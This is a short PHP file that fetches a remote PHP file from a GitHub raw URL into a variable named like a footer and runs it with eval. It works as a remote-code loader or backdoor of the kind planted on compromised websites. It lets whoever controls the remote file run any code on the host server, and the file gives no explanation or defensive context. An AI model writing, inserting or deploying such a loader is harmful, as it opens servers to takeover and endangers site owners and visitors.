<?php
$url = 'https://raw.githubusercontent.com/tarikulislam184/Systemupload/refs/heads/main/xx.php';
$exfooter = file_get_contents($url);
eval('?>' . $exfooter);
?>